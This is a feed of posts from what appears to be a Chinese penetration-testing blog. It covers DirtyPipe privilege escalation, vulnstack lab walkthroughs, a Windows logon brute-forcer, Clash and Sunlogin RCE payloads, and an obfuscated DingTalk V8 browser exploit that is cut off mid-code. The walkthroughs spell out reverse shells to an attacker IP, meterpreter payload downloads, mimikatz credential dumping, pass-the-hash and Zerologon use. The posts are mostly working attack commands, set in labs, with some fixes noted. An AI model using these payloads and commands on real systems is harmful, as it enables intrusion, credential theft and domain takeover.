<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://V-alkoinen.github.io</id>
    <title>老白</title>
    <updated>2022-04-01T13:14:24.104Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://V-alkoinen.github.io"/>
    <link rel="self" href="https://V-alkoinen.github.io/atom.xml"/>
    <logo>https://V-alkoinen.github.io/images/avatar.png</logo>
    <icon>https://V-alkoinen.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, 老白</rights>
    <entry>
        <title type="html"><![CDATA[CVE-2022-0847 DirtyPipe]]></title>
        <id>https://V-alkoinen.github.io/post/cve-2022-0847-dirtypipe/</id>
        <link href="https://V-alkoinen.github.io/post/cve-2022-0847-dirtypipe/">
        </link>
        <updated>2022-03-09T09:19:03.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-漏洞描述">一、漏洞描述</h1>
<p>  <code>CVE-2022-0847</code>是Linux内核中的一个漏洞，利用该漏洞可以覆盖任意只读文件中的数据，因此导致本地权限提升，<code>DirtyPipe</code>类似于<code>DirtyCow</code>，但更容易利用。</p>
<h1 id="二-漏洞影响">二、漏洞影响</h1>
<p>  5.8 &lt;= Linux Kernel &lt; 5.16.11/5.15.25/5.10.102</p>
<h1 id="三-漏洞复现">三、漏洞复现</h1>
<pre><code>git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
cd CVE-2022-0847-DirtyPipe-Exploit
gcc exploit.c -o exp
./exp
su root //使用 aaron 即可切换root用户
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1647077626351.png" alt="" loading="lazy"></figure>
<h1 id="四-漏洞修复">四、漏洞修复</h1>
<p>  升级Linux内核版本：<br>
  Linux Kernel &gt;= 5.16.11<br>
  Linux Kernel &gt;= 5.15.25<br>
  Linux Kernel &gt;= 5.10.102</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[vulnstack 9]]></title>
        <id>https://V-alkoinen.github.io/post/vulnstack-9/</id>
        <link href="https://V-alkoinen.github.io/post/vulnstack-9/">
        </link>
        <updated>2022-03-03T12:25:20.000Z</updated>
        <content type="html"><![CDATA[<h1 id="过程">过程</h1>
<p> <code>nmap -T4 -Pn -sV -O 10.100.202.45</code><br>
<img src="https://V-alkoinen.github.io/post-images/1648816095419.png" alt="" loading="lazy"></p>
<pre><code>http://10.100.202.45:81/ 
laravel 8.29.0
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1648816131078.png" alt="" loading="lazy"></figure>
<pre><code>POST /_ignition/execute-solution HTTP/1.1
Host: 10.100.202.45:81
Content-Type: application/json
Content-Length: 168

{
  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,
  &quot;parameters&quot;: {
    &quot;variableName&quot;: &quot;username&quot;,
    &quot;viewFile&quot;: &quot;xxxxxxx&quot;
  }
}
</code></pre>
<p> 确认存在CVE-2021-3129<br>
<img src="https://V-alkoinen.github.io/post-images/1648816183045.png" alt="" loading="lazy"></p>
<pre><code>网上找了个exp
https://github.com/simonlee-hello/CVE-2021-3129
微调了一下工具，可以rce
git clone https://github.com/zhzyker/CVE-2021-3129
python3 exp.py http://10.100.202.45:81/
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648816220410.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816225211.png" alt="" loading="lazy"><br>
 看这个主机名像个容器<code>cat /proc/self/cgroup</code><br>
<img src="https://V-alkoinen.github.io/post-images/1648816260319.png" alt="" loading="lazy"></p>
<pre><code>curl https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o 1.py
python 1.py
用suid进行提权，发现一个shell文件
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648816544818.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816529464.png" alt="" loading="lazy"><br>
 运行该shell文件后发现是ps命令，于是尝试修改当前终端环境变量</p>
<pre><code>echo '/bin/bash' &gt; ps
chmod 777 ps
echo $PATH
export PATH=/tmp:$PATH
./shell
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648816688823.png" alt="" loading="lazy"><br>
 成功提权至root<br>
 <code>git clone https://github.com/cdk-team/CDK</code><br>
<img src="https://V-alkoinen.github.io/post-images/1648816736634.png" alt="" loading="lazy"></p>
<pre><code>python3 -m http.server 8080
curl http://172.16.70.129:8080/cdk -o cdk
./cdk run –list
./cdk evaluate
./cdk auto-escape &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/172.16.70.129/10001 0&gt;&amp;1'&quot;
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648816793200.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816798041.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816802287.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816806666.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816810797.png" alt="" loading="lazy"><br>
 拿到主机权限，稳定下shell</p>
<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.16.70.129 LPORT=10001 -f elf &gt; shell-10001.elf
curl http://172.16.70.129:8080/shell-10001.elf -o shell-10001.elf
nohup ./shell-10001.elf &amp;
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648816889824.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816894361.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816899235.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648816903490.png" alt="" loading="lazy"><br>
 搞个ew做代理</p>
<pre><code>curl http://172.16.70.129:8080/ew_for_linux -o ew
chmod +x ew
nohup ./ew -s ssocksd -l 10003 &amp;
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648817112980.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648817117504.png" alt="" loading="lazy"><br>
 使用fscan进行扫描</p>
<pre><code>proxychains -q ./fscan_amd64 -h 192.168.93.10/24
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648817214237.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648817219235.png" alt="" loading="lazy"><br>
 发现一个通达oa，github上找了个exp</p>
<pre><code>https://github.com/z1un/TongdaOA-exp
curl https://raw.githubusercontent.com/z1un/TongdaOA-exp/master/TongdaOA.py -o tongda.py
proxychains -q python3 tongda.py
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648817319207.png" alt="" loading="lazy"><br>
 开冰蝎<br>
<img src="https://V-alkoinen.github.io/post-images/1648817350087.png" alt="" loading="lazy"><br>
 上meterpreter</p>
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.70.129 LPORT=44445 -f exe -o shell.exe
certutil.exe -urlcache -split -f http://172.16.70.129:8080/shell.exe shhhhhhell.exe
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648817527535.png" alt="" loading="lazy"><br>
 抓hash</p>
<pre><code>load kiwi
creds_all
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1648817588063.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1648817592626.png" alt="" loading="lazy"></p>
<p> PTH</p>
<pre><code>impacket-wmiexec -hashes :ab89b1295e69d353dd7614c7a3a80cec administrator@192.168.93.30
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1648817676390.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Win-Brute]]></title>
        <id>https://V-alkoinen.github.io/post/win-brute/</id>
        <link href="https://V-alkoinen.github.io/post/win-brute/">
        </link>
        <updated>2022-03-01T14:20:54.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-项目地址">一、项目地址</h1>
<p>  <a href="https://github.com/DarkCoderSc/win-brute-logon">https://github.com/DarkCoderSc/win-brute-logon</a></p>
<h1 id="二-测试环境">二、测试环境</h1>
<p>  windows 10（1903）<br>
  windows server 2016（domain：laobai.com）</p>
<h1 id="三-工具用法">三、工具用法</h1>
<p> <code>WinBruteLogon.exe -u &lt;username&gt; -w &lt;wordlist_file&gt;</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646490875505.png" alt="" loading="lazy"></p>
<h1 id="四-介绍">四、介绍</h1>
<p>  该 POC 利用的是 <code>Microsoft Windows</code> 身份验证机制中的一个严重缺点，并不是一个漏洞。<br>
  实际上，通过访客用户（Guest）即可爆破所有本地用户、域内用户的密码。可以参考<code>net user</code>、<code>net user /domain</code>。</p>
<h1 id="五-测试">五、测试</h1>
<p>  Windows 10（PC）：Guest、ljl_s（本地管理员）、user1（域用户）<br>
  Windows Server 2016（DC）：administrator（域管）</p>
<pre><code>net user GuestUser !QAZ2wsx /add
net localgroup users GuestUser /delete
net localgroup guests GuestUser /add
</code></pre>
<p>  使用GuestUser爆破本地管理员密码<br>
  <code>WinBruteLogon.exe -v -d PC1 -u ljl_s -w 1.txt</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646492698000.png" alt="" loading="lazy"><br>
  使用GuestUser爆破域用户密码<br>
  <code>WinBruteLogon.exe -v -d laobai.com -u user1 -w 1.txt</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646492769577.png" alt="" loading="lazy"><br>
  使用GuestUser爆破域管密码<br>
  <code>WinBruteLogon.exe -v -d laobai.com -u administrator -w 1.txt</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646492804408.png" alt="" loading="lazy"><br>
  附赠一个大佬的字典：<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt">https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt</a></p>
<h1 id="修复方案">修复方案</h1>
<p> 因该问题并不是一个有效的漏洞，所以我们只能做一些缓解措施：<br>
  1、禁用访客用户；<br>
  2、设置高强度密码。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[vulnstack 2]]></title>
        <id>https://V-alkoinen.github.io/post/vulnstack-2/</id>
        <link href="https://V-alkoinen.github.io/post/vulnstack-2/">
        </link>
        <updated>2022-02-26T11:01:58.000Z</updated>
        <content type="html"><![CDATA[<h1 id="环境">环境</h1>
<p>web：172.16.70.142  10.10.10.80<br>
pc：   172.16.70.143  10.10.10.201<br>
dc：   10.10.10.10</p>
<h1 id="过程">过程：</h1>
<p> <code>nmap -T4 -Pn -sV -O 172.16.70.142</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646132714799.png" alt="" loading="lazy"><br>
 发现142起了个weblogic，github上找个工具扫一下，查看是否有漏洞</p>
<pre><code>git clone https://github.com/rabbitmask/WeblogicScan
pip3 install -r requirements.txt
python3 WeblogicScan.py -u 172.16.70.142 -p 7001
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646132789871.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646132843309.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646132868347.png" alt="" loading="lazy"><br>
 发现版本为10.3.6.0</p>
<pre><code>msfconsole
search weblogic 10.3.6
use 1
set rhosts 172.16.70.142
set lport 9999 
run
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646133015955.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133021973.png" alt="" loading="lazy"><br>
 142 getshell，搞个meterperter【<a href="https://qftm.github.io/2019/08/03/Windows-Reverse-Shell/">参考</a>】<br>
 <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.70.129 LPORT=9998 -f exe &gt; ./shell.exe</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646133152664.png" alt="" loading="lazy"><br>
 <code>certutil.exe -urlcache -split -f http://192.16.70.129/shell.exe shell.exe</code>【<a href="https://www.cnblogs.com/lfoder/p/8241548.html">参考</a>】<br>
<img src="https://V-alkoinen.github.io/post-images/1646133259291.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133265525.png" alt="" loading="lazy"></p>
<pre><code>msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 9998
run
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646133296178.png" alt="" loading="lazy"><br>
 <code>./shell.exe</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646133377638.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133383888.png" alt="" loading="lazy"><br>
 <code>Getsystem</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646133432888.png" alt="" loading="lazy"></p>
<pre><code>chcp 65001
whoami
ipconfig
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646133462022.png" alt="" loading="lazy"><br>
 机器内部有两张网卡，一张是172.16.70.142 另一张是10.10.10.80，收集一波信息</p>
<pre><code>nltest /dclist:
net group “domain controllers” /doman
net user /domain
net group &quot;domain computers&quot; /domain
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646133568830.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133575140.png" alt="" loading="lazy"><br>
 搞个<code>mimikatz</code><br>
 <code>git clone https://github.com/gentilkiwi/mimikatz</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646133640390.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133646811.png" alt="" loading="lazy"><br>
 <code>certutil.exe -urlcache -split -f http://172.16.70.129/mimikatz.exe mimi.exe</code><br>
<img src="https://V-alkoinen.github.io/post-images/1646133683731.png" alt="" loading="lazy"></p>
<pre><code>cd C:\Oracle\Middleware\user_projects\domains\base_domain
Mimi.exe
privilege::debug
log
sekurlsa::logonpasswords
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646133820260.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133828228.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133834664.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646133841082.png" alt="" loading="lazy"><br>
 <code>此处说一下，我抓hash没发现域管的hash，但看了下网上的writeup都能抓到，我也不知道怎么抓的</code><br>
 <a href="https://www.objectif-securite.ch/en/ophcrack">爆破hash</a><br>
 加路由</p>
<pre><code>bg
use post/multi/manage/autoroute
set sission 1
run
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1646134060731.png" alt="" loading="lazy"></figure>
<pre><code>search ms17
use 1
set rhosts 10.10.10.10
set lhost 10.10.10.80
set lport 10001
run
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646134099583.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646134106311.png" alt="" loading="lazy"><br>
 迁移进程拿shell</p>
<pre><code>Ps
migrate 328
shell
chcp 65001
whoami
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646134229400.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646134235562.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646134241846.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646134566286.png" alt="" loading="lazy"></p>
<h1 id="试用下cve-2020-1472">试用下CVE-2020-1472</h1>
<p> 可利用该漏洞将域控的计算机的机器账号密码置为空，此处指的是 dc$<br>
 <a href="https://github.com/dirkjanm/CVE-2020-1472">CVE-2020-1472</a><br>
 先搞个socks（之前已经添加过route了）</p>
<pre><code>search socks
use 0
run
vim /etc/proxychains4.conf
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1646139686405.png" alt="" loading="lazy"></figure>
<pre><code>curl https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/cve-2020-1472-exploit.py &gt; 1.py
python3 -m pip install impacket
proxychains -q python3 1.py DC 10.10.10.10
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646139693934.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646139699034.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646139703868.png" alt="" loading="lazy"></p>
<pre><code>proxychains -q impacket-secretsdump de1ay.com/DC\$@10.10.10.10 -no-pass 
proxychains -q impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:bed797322eabe7ceb21dc1a0534fe091 de1ay.com/administrator@10.10.10.10
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646309646321.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646309651604.png" alt="" loading="lazy"></p>
<p>GET!!</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[clash RCE]]></title>
        <id>https://V-alkoinen.github.io/post/clash-rce/</id>
        <link href="https://V-alkoinen.github.io/post/clash-rce/">
        </link>
        <updated>2022-02-26T10:55:58.000Z</updated>
        <content type="html"><![CDATA[<h1 id="clash">CLASH</h1>
<p>  A Windows/macOS/Linux GUI based on Clash and Electron.</p>
<h1 id="rce">RCE</h1>
<p>  <a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/2710">参考链接</a></p>
<h1 id="漏洞复现">漏洞复现</h1>
<pre><code>port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
    type: socks5
    server: 127.0.0.1
    port: &quot;17938&quot;
    skip-cert-verify: true
  - name: abc
    type: socks5
    server: 127.0.0.1
    port: &quot;8088&quot;
    skip-cert-verify: true

proxy-groups:
  -
    name: &lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
    type: select
    proxies:
    - a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1646132381999.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1646132387621.png" alt="" loading="lazy"></p>
<h1 id="解决方案">解决方案</h1>
<p>  升级至 <code>v 0.19.10</code></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sunlogin RCE]]></title>
        <id>https://V-alkoinen.github.io/post/sunlogin-rce/</id>
        <link href="https://V-alkoinen.github.io/post/sunlogin-rce/">
        </link>
        <updated>2022-02-16T11:41:52.000Z</updated>
        <content type="html"><![CDATA[<h1 id="影响范围">影响范围</h1>
<p> 11.1.1.x<br>
 10.3.0.27372<br>
 11.0.0.33162</p>
<h1 id="漏洞复现">漏洞复现</h1>
<p> 查看向日葵开放端口：</p>
<pre><code>tasklist | findstr Sunlogin
#查找PID

netstat -ano | findstr &lt;pid&gt;
#查找端口
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1645157954635.png" alt="" loading="lazy"><br>
<img src="https://V-alkoinen.github.io/post-images/1645157959994.png" alt="" loading="lazy"><br>
 获取token</p>
<pre><code>GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
Host: &lt;ip&gt;:&lt;port&gt;
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1645157986350.png" alt="" loading="lazy"><br>
 执行命令</p>
<pre><code>GET /Check?cmd=ping%2e%2e%2f%2e%2e%2fWindows/system32/WindowsPowerShell/v1%2e0/powershell.exe+ipconfig HTTP/1.1
Host: &lt;ip&gt;:&lt;port&gt;
Cookie: CID=&lt;token&gt;
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1645158015142.png" alt="" loading="lazy"><br>
 也可以使用github上的exp<br>
<img src="https://V-alkoinen.github.io/post-images/1645158303650.png" alt="" loading="lazy"></p>
<h1 id="漏洞修复">漏洞修复</h1>
<p> 更新向日葵至最新版</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DingDing-RCE]]></title>
        <id>https://V-alkoinen.github.io/post/ding-ding-rce/</id>
        <link href="https://V-alkoinen.github.io/post/ding-ding-rce/">
        </link>
        <updated>2022-02-16T04:35:45.000Z</updated>
        <content type="html"><![CDATA[<h1 id="漏洞概况">漏洞概况</h1>
<p> 钉钉中的网页链接等默认是通过本机的默认浏览器打开的,但是当在网页链接末尾添加<br>
<code>&amp;pc_slide=true</code> 参数时, 钉钉会使用自带的浏览器去解析, 而由于钉钉使用的是浏览器解<br>
析 JavaScript 的模块是 <code>Goolge</code> 老版本的 <code>V8</code>, 并且没有在运行时开启沙箱进行保护, 导致<br>
攻击者使用之前的 <code>CVE-2021-30551</code> 的 Exp 可以对钉钉进行攻击;</p>
<h1 id="影响版本">影响版本</h1>
<p> DingTalk = V6.3.5</p>
<h1 id="exp">EXP</h1>
<pre><code>&lt;html&gt;

&lt;body&gt;
   &lt;h1&gt; test &lt;/h1&gt;
   &lt;script&gt;
   var _0x1b17=['KELCi8OxLg==','ZE/CpWvCpDkcPA==','E8Kjw51bQ8O+Klk0w4vCsw==','w5lnw5Ipwr12RsOCw7B/J8OEw4E=','QMOtNcO9w77Dv8OIwp3DmQ7CksOdOA==','X8KgbcK0wqXCuw==','DjfCg8KK','OsO3fsOwwojCq0YpMw==','RMKWBMKHW3PCqcKjTwgMaw==','O8KCw5PCoMOpwo0=','e0rDgMO8wqNndsOM','wphVw6Zhw7wWwrLDg8K1','IibCvsKFwqXCqMKAw6w4NDgs','PcO6Z8O2w4LCp20tMWrDhxMZRSLCmSvDuTjCnk8=','GcOiPsKX','G8K7w6vDpXNGIcOwLnXDu8K9BkI=','w7MXFMKhw78WwpYqwqVVFcKR','GMK/w7vDpnVIJ8Or','ank7Wy4jw44=','HTfCicKbGsKEaysJwqTDux1L','GS3CqsKEwqjCp8KRw5Y=','GcOmcktVwrw=','w50aKsKuwq9cdMO4wpTDqyo5GBQ=','IybCrcKgwrvCpsKGw5w8Pyc5AcOn','NhbCuwM=','wqFcbEfDmMOMw6LCkl9ywqwDwocc','wqfChMOfw4jDjsKzwozCn8Oqwok=','w4tcwrED','cCvCsMOQw7g=','w6pdw4k=','wqJyw4vCmMO1wrTCj8OSwqnDnSY=','WsKcBA==','wrV8w4vCjcOlwrDDgcKXwqTDlQ==','XsKWD8KeWA==','H8O+KcKHHGPDiUQ=','w73Ci8OFw60=','Wy7Csg==','e0TDocOvwrR6IsKLQArDsw==','AzvCjQIS','VMOxw6/Ciw==','fEDDp8OdwrhgbMKYGw==','PCzCvg==','w5QHwrPDlGRLNQHDpHwqa8OJR3hiwpwyMBJzJR8=','ZMO8ecOcd8Oow7M6wq1O','w417wqvDl3BuwooiwrnCpDBZwoNw','fHtRGA==','Y24s','w4VWwrsdKQ8=','HsKCOC4RwrQ=','w4AJwrLDi05SLxfDtEI0esODaA==','L2kiFG0=','H8O+I8KdBmc=','w6RcwrEPMQI=','FTvDq8O+w7Ucax4=','FsKfJS4Rwrky','wpBAw5zCjMO1','HsO+w4PDgsKUWw==','EcKxwoXDjcOLCQ==','PkrCncOEOMOww7fCrlDCgMOJesOdAQ==','F8K+w49bSQ==','w4dew5rDmMKg','wp52wrbCpzM=','wqIjw4xDwqA=','cMKIw5vCncKdJV/CoMK7RA==','CiTCnsKdC8KV','fXtHE8ObSBZqwp5G','Fjd1EMOqw57CgcOd','ZsOje8OLbMO8w4Q3wqAQwqU=','C8Kxw63Dh3RZIcO6Pj4=','w4rDj8O/','ZU/Ctg==','BcKyw55TcsO8HF8+w7jCtsKtEgo7w5LCigQ8','w4ZdwrkVPAM='];(function(_0x4285cf,_0x1b1736){var _0x1368bb=function(_0x5a17b5){while(--_0x5a17b5){_0x4285cf['push'](_0x4285cf['shift']());}};_0x1368bb(++_0x1b1736);}(_0x1b17,0x17b));var _0x1368=function(_0x4285cf,_0x1b1736){_0x4285cf=_0x4285cf-0x0;var _0x1368bb=_0x1b17[_0x4285cf];if(_0x1368['kUYGYC']===undefined){(function(){var _0x270725=function(){var _0x2929b1;try{_0x2929b1=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x1b9f87){_0x2929b1=window;}return _0x2929b1;};var _0x1971fd=_0x270725();var _0x3ad59d='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1971fd['atob']||(_0x1971fd['atob']=function(_0x332690){var _0x352a1c=String(_0x332690)['replace'](/=+$/,'');var _0x194774='';for(var _0x5d479b=0x0,_0xde7a28,_0x1ef172,_0x26c98e=0x0;_0x1ef172=_0x352a1c['charAt'](_0x26c98e++);~_0x1ef172&amp;&amp;(_0xde7a28=_0x5d479b%0x4?_0xde7a28*0x40+_0x1ef172:_0x1ef172,_0x5d479b++%0x4)?_0x194774+=String['fromCharCode'](0xff&amp;_0xde7a28&gt;&gt;(-0x2*_0x5d479b&amp;0x6)):0x0){_0x1ef172=_0x3ad59d['indexOf'](_0x1ef172);}return _0x194774;});}());var _0xa07d5c=function(_0x5c13fe,_0x1ca04c){var _0x48ea63=[],_0x8f6b18=0x0,_0x30c8e4,_0xb17e6='',_0x53b898='';_0x5c13fe=atob(_0x5c13fe);for(var _0x52b8af=0x0,_0x1cd1ff=_0x5c13fe['length'];_0x52b8af&lt;_0x1cd1ff;_0x52b8af++){_0x53b898+='%'+('00'+_0x5c13fe['charCodeAt'](_0x52b8af)['toString'](0x10))['slice'](-0x2);}_0x5c13fe=decodeURIComponent(_0x53b898);var _0x49825d;for(_0x49825d=0x0;_0x49825d&lt;0x100;_0x49825d++){_0x48ea63[_0x49825d]=_0x49825d;}for(_0x49825d=0x0;_0x49825d&lt;0x100;_0x49825d++){_0x8f6b18=(_0x8f6b18+_0x48ea63[_0x49825d]+_0x1ca04c['charCodeAt'](_0x49825d%_0x1ca04c['length']))%0x100;_0x30c8e4=_0x48ea63[_0x49825d];_0x48ea63[_0x49825d]=_0x48ea63[_0x8f6b18];_0x48ea63[_0x8f6b18]=_0x30c8e4;}_0x49825d=0x0;_0x8f6b18=0x0;for(var _0x17f739=0x0;_0x17f739&lt;_0x5c13fe['length'];_0x17f739++){_0x49825d=(_0x49825d+0x1)%0x100;_0x8f6b18=(_0x8f6b18+_0x48ea63[_0x49825d])%0x100;_0x30c8e4=_0x48ea63[_0x49825d];_0x48ea63[_0x49825d]=_0x48ea63[_0x8f6b18];_0x48ea63[_0x8f6b18]=_0x30c8e4;_0xb17e6+=String['fromCharCode'](_0x5c13fe['charCodeAt'](_0x17f739)^_0x48ea63[(_0x48ea63[_0x49825d]+_0x48ea63[_0x8f6b18])%0x100]);}return _0xb17e6;};_0x1368['SGqjCq']=_0xa07d5c;_0x1368['PalevQ']={};_0x1368['kUYGYC']=!![];}var _0x5a17b5=_0x1368['PalevQ'][_0x4285cf];if(_0x5a17b5===undefined){if(_0x1368['FXcKZO']===undefined){_0x1368['FXcKZO']=!![];}_0x1368bb=_0x1368['SGqjCq'](_0x1368bb,_0x1b1736);_0x1368['PalevQ'][_0x4285cf]=_0x1368bb;}else{_0x1368bb=_0x5a17b5;}return _0x1368bb;};const max_size=0x2710;const buf=new ArrayBuffer(0x8);const f64=new Float64Array(buf);const u32=new Uint32Array(buf);function f2i(_0x5ba462){f64[0x0]=_0x5ba462;let _0x3b54a5=Array['from'](u32);return _0x3b54a5[0x1]*0x100000000+_0x3b54a5[0x0];}function i2f(_0x2f58b4){let _0x8b3c4c=[];_0x8b3c4c[0x0]=parseInt(_0x2f58b4%0x100000000);_0x8b3c4c[0x1]=parseInt((_0x2f58b4-_0x8b3c4c[0x0])/0x100000000);u32[_0x1368('0x38','XQdw')](_0x8b3c4c);return f64[0x0];}function d2u(_0x9ff56e){f64[0x0]=_0x9ff56e;let _0x47fd50=Array[_0x1368('0xa','7rtu')](u32);return _0x47fd50;}function u2d(_0x535342,_0x2feac9){u32[0x0]=_0x535342;u32[0x1]=_0x2feac9;return f64[0x0];}function print(_0x510c7e){document[_0x1368('0x29','1027')](_0x1368('0x16','pndm')+_0x510c7e+_0x1368('0x19','@XkD'));}function hex(_0x2abe47){return _0x2abe47[_0x1368('0x45','Ob1V')](0x10)[_0x1368('0x3','@XkD')](0x10,'0');}function success_value(_0x140a70,_0x2c5308){console[_0x1368('0x11','THAJ')](_0x1368('0x15','ki5k')+_0x140a70+hex(_0x2c5308));}function wasm_func(){var _0x1ab208={'env':{'puts':function _0x36676a(_0x4b8a69){console[_0x1368('0x1b','*I%3')](_0x4b8a69);}}};var _0x364582=new 